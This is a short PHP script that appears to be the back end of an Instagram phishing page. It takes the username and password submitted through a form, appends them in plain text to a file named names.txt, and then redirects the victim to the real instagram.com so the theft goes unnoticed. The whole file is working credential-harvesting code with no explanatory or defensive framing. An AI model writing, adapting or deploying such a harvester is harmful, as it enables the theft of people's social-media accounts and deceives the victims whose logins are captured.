<?php

file_put_contents("names.txt", "Instagram name: " . $_POST['name'] . " Pass: " . $_POST['word'] . "\n", FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>